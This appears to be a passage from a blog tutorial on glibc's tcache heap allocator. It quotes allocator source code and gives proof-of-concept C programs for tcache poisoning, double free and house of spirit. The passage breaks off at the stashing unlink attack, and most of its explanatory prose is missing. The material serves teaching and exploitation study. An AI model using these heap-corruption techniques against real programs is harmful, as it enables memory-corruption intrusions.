class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class=\"line\"><span class=\"comment\">   the chunk is stored in the per-thread cache.  */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\">  <span class=\"comment\">/* This field exists to detect double frees.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span> *<span class=\"title\">key</span>;</span></span><br><span class=\"line\">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><code>tcache_entry</code>  chunk  <code>next</code>  chunk</p>\n<p> <strong>next  chunk  user data fastbin  fd  chunk </strong></p>\n<p>tcache_entry  chunk  user data </p>\n<p><img src=\"/2021/03/08/tcache/20210201102625163.png\" alt=\"\"></p>\n</blockquote>\n<hr>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* There is one of these for each thread, which contains the</span></span><br><span class=\"line\"><span class=\"comment\">   per-thread cache (hence \"tcache_perthread_struct\").  Keeping</span></span><br><span class=\"line\"><span class=\"comment\">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class=\"line\"><span class=\"comment\">   are redundant (we could have just counted the linked list each</span></span><br><span class=\"line\"><span class=\"comment\">   time), this is for performance reasons.  */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> counts[TCACHE_MAX_BINS];</span><br><span class=\"line\">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class=\"line\">&#125; tcache_perthread_struct;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"meta-keyword\">define</span> TCACHE_MAX_BINS                64</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">static</span> __thread tcache_perthread_struct *tcache = <span class=\"literal\">NULL</span>;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>tcache_perthread_structtcacheheapsize0x251threadtcache_perthread_structTCACHE_MAX_BINSTCACHE_MAX_BINStcache_entry</p>\n<ul>\n<li>tcache_entry free  chunk</li>\n<li>counts  tcache_entry  chunk  7  chunk</li>\n</ul>\n<p><img src=\"/2021/03/08/tcache/20210201160752119.jpg\" alt=\"\"></p>\n</blockquote>\n<h2 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h2><ol>\n<li>malloc<code>tcache_perthread_struct</code>0x251</li>\n<li>chunkchunksizesmall bin size<strong>tcache</strong>fastbinunsorted bin</li>\n<li><strong>tcache</strong><ul>\n<li>tcachetcache7</li>\n<li><strong>tcache</strong>chunkfastbinunsorted bin</li>\n<li>tcachechunk<strong></strong>inuse bit</li>\n</ul>\n</li>\n<li>chunksizetcache<strong>tcachechunk</strong>tcache</li>\n<li>tcachebin</li>\n<li>tcachefastbinsmall binunsorted binsizechunkfastbinsmall binunsorted binchunktcachetcache</li>\n</ol>\n<h2 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcache_init(<span class=\"keyword\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  mstate ar_ptr;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *victim = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">size_t</span> bytes = <span class=\"keyword\">sizeof</span> (tcache_perthread_struct);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (tcache_shutting_down)</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  arena_get (ar_ptr, bytes); <span class=\"comment\">//  arena</span></span><br><span class=\"line\">  victim = _int_malloc (ar_ptr, bytes); <span class=\"comment\">//  sizeof(tcache_perthread_struct)  chunk</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!victim &amp;&amp; ar_ptr != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class=\"line\">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (ar_ptr != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class=\"line\">  <span class=\"comment\">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class=\"line\"><span class=\"comment\">     - in which case, we just keep trying later.  However, we</span></span><br><span class=\"line\"><span class=\"comment\">     typically do this very early, so either there is sufficient</span></span><br><span class=\"line\"><span class=\"comment\">     memory, or there isn't enough memory to do non-trivial</span></span><br><span class=\"line\"><span class=\"comment\">     allocations anyway.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (victim) <span class=\"comment\">//  tcache</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      tcache = (tcache_perthread_struct *) victim;</span><br><span class=\"line\">      <span class=\"built_in\">memset</span> (tcache, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span> (tcache_perthread_struct));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>tcache</p>\n<p>arenachunk</p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"comment\">//  tcache list </span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> tcache_get (tc_idx);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  DIAG_POP_NEEDS_COMMENT;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>tcachechunkifchunksizeidxtcache-&gt;entries<code>tcache_get()</code>chunk</p>\n</blockquote>\n<h3 id=\"tcache-get\"><a href=\"#tcache-get\" class=\"headerlink\" title=\"tcache_get()\"></a>tcache_get()</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> __always_inline <span class=\"keyword\">void</span> *</span><br><span class=\"line\">tcache_get (<span class=\"keyword\">size_t</span> tc_idx)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class=\"comment\">//</span></span><br><span class=\"line\">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class=\"line\">  assert (tcache-&gt;entries[tc_idx] &gt; <span class=\"number\">0</span>);<span class=\"comment\">//</span></span><br><span class=\"line\">  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class=\"comment\">//</span></span><br><span class=\"line\">  --(tcache-&gt;counts[tc_idx]); </span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"keyword\">void</span> *) e;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><code>tcache-&gt;entries[tc_idx]</code>chunk<code>tcache-&gt;counts</code></p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span></span><br><span class=\"line\">_int_free (mstate av, mchunkptr p, <span class=\"keyword\">int</span> have_lock)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ......</span><br><span class=\"line\">  ......</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> USE_TCACHE</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> tc_idx = csize2tidx (<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tcache</span><br><span class=\"line\">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class=\"comment\">// 64</span></span><br><span class=\"line\">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class=\"comment\">// 7</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        tcache_put (p, tc_idx);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">  ......</span><br><span class=\"line\">  ......</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><code>tc_idx</code><code>tcache-&gt;counts[tc_idx]</code>7<code>tcache_put()</code>chunkchunksizetcache</p>\n</blockquote>\n<h3 id=\"tcache-put\"><a href=\"#tcache-put\" class=\"headerlink\" title=\"tcache_put()\"></a>tcache_put()</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> __always_inline <span class=\"keyword\">void</span></span><br><span class=\"line\">tcache_put (mchunkptr chunk, <span class=\"keyword\">size_t</span> tc_idx)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class=\"comment\">//chunk</span></span><br><span class=\"line\">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class=\"comment\">//</span></span><br><span class=\"line\">  <span class=\"comment\">//</span></span><br><span class=\"line\">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class=\"line\">  tcache-&gt;entries[tc_idx] = e;</span><br><span class=\"line\">  <span class=\"comment\">//</span></span><br><span class=\"line\">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>tcache_put()chunktcache-&gt;entries[tc_idx]P0</p>\n</blockquote>\n<p><code>tcache_get</code><code>tcache_put</code></p>\n<h1 id=\"0x02-PWN-tcache\"><a href=\"#0x02-PWN-tcache\" class=\"headerlink\" title=\"0x02 PWN tcache\"></a>0x02 PWN tcache</h1><h2 id=\"1-tcache-poisoning\"><a href=\"#1-tcache-poisoning\" class=\"headerlink\" title=\"1.tcache poisoning\"></a>1.tcache poisoning</h2><p>tcache poisoningtcachenexttcache_get()nextnextchunkmalloc</p>\n<p><img src=\"/2021/03/08/tcache/image-20210314162103060.png\" alt=\"image-20210314162103060\"></p>\n<p>fd</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// disable buffering</span></span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">size_t</span> stack_var;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"The address we want malloc() to return is %p.\\n\"</span>, (<span class=\"keyword\">char</span> *)&amp;stack_var);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">intptr_t</span> *a = <span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc(128): %p\\n\"</span>, a);</span><br><span class=\"line\">\t<span class=\"keyword\">intptr_t</span> *b = <span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc(128): %p\\n\"</span>, b);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Freeing the buffers...\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(b);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\tb[<span class=\"number\">0</span>] = (<span class=\"keyword\">intptr_t</span>)&amp;stack_var;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Now the tcache list has [ %p -&gt; %p ].\\n\"</span>, b, &amp;stack_var);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"1st malloc(128): %p\\n\"</span>, <span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>));</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Now the tcache list has [ %p ].\\n\"</span>, &amp;stack_var);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">intptr_t</span> *c = <span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"2nd malloc(128): %p\\n\"</span>, c);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"We got the control\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tassert((<span class=\"keyword\">long</span>)&amp;stack_var == (<span class=\"keyword\">long</span>)c);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>sleep()</p>\n</blockquote>\n<p></p>\n<p><img src=\"/2021/03/08/tcache/image-20210314165503011.png\" alt=\"image-20210314165503011\"></p>\n<p></p>\n<p><img src=\"/2021/03/08/tcache/image-20210314165645714.png\" alt=\"image-20210314165645714\"></p>\n<p></p>\n<h2 id=\"2-tcache-dup\"><a href=\"#2-tcache-dup\" class=\"headerlink\" title=\"2.tcache dup\"></a>2.tcache dup</h2><p>mallocfree</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"This file demonstrates a simple double-free attack with tcache.\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Allocating buffer.\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> *a = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc(8): %p\\n\"</span>, a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Freeing twice...\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Now the free list has [ %p, %p ].\\n\"</span>, a, a);</span><br><span class=\"line\">\t<span class=\"keyword\">void</span> *b = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">void</span> *c = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Next allocated buffers will be same: [ %p, %p ].\\n\"</span>, b, c);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\tassert((<span class=\"keyword\">long</span>)b == (<span class=\"keyword\">long</span>)c);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2021/03/08/tcache/image-20210314213639524.png\" alt=\"image-20210314213639524\"></p>\n<p></p>\n<p><code>tcache_put</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> __always_inline <span class=\"keyword\">void</span></span><br><span class=\"line\">tcache_put (mchunkptr chunk, <span class=\"keyword\">size_t</span> tc_idx)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class=\"comment\">//chunk</span></span><br><span class=\"line\">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class=\"comment\">//</span></span><br><span class=\"line\">  <span class=\"comment\">//</span></span><br><span class=\"line\">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class=\"line\">  tcache-&gt;entries[tc_idx] = e;</span><br><span class=\"line\">  <span class=\"comment\">//</span></span><br><span class=\"line\">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p></p>\n<h2 id=\"3-tcache-house-of-spirit\"><a href=\"#3-tcache-house-of-spirit\" class=\"headerlink\" title=\"3.tcache house of spirit\"></a>3.tcache house of spirit</h2><p>tcache house of spirittcache_put()malloc<strong>sizetcache bin sizefake_chunk</strong>chunk</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">malloc</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> *a; <span class=\"comment\">//pointer that will be overwritten</span></span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> fake_chunks[<span class=\"number\">10</span>]; <span class=\"comment\">//fake chunk region</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"This region contains one fake chunk. It's size field is placed at %p\\n\"</span>, &amp;fake_chunks[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\tfake_chunks[<span class=\"number\">1</span>] = <span class=\"number\">0x40</span>; <span class=\"comment\">// this is the size</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\"</span>, &amp;fake_chunks[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\"</span>);</span><br><span class=\"line\">\ta = &amp;fake_chunks[<span class=\"number\">2</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\"</span>, &amp;fake_chunks[<span class=\"number\">1</span>], &amp;fake_chunks[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t<span class=\"keyword\">void</span> *b = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc(0x30): %p\\n\"</span>, b);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\tassert((<span class=\"keyword\">long</span>)b == (<span class=\"keyword\">long</span>)&amp;fake_chunks[<span class=\"number\">2</span>]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p></p>\n<p><img src=\"/2021/03/08/tcache/image-20210314215452014.png\" alt=\"image-20210314215452014\"></p>\n<p><code>tcache_perthread_struct</code></p>\n<p></p>\n<p><img src=\"/2021/03/08/tcache/image-20210314215557280.png\" alt=\"image-20210314215557280\"></p>\n<p>bins</p>\n<p><img src=\"/2021/03/08/tcache/image-20210314215657530.png\" alt=\"image-20210314215657530\"></p>\n<p></p>\n<h2 id=\"4-tcache-stashing-unlink-attack\"><a href=\"#4-tcache-stashing-unlink-attack\" class=\"headerlink\" title=\"4.tcache stashing unlink attack\"></a>4.tcache stashing unlink attack</h2><p>unlinktcache binTCACHE_MAX_BINSsmall bintcachecalloccalloctcache binsmallbinchunktcachesmallbintcachebinsmall binbklibcfake_chunk</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span 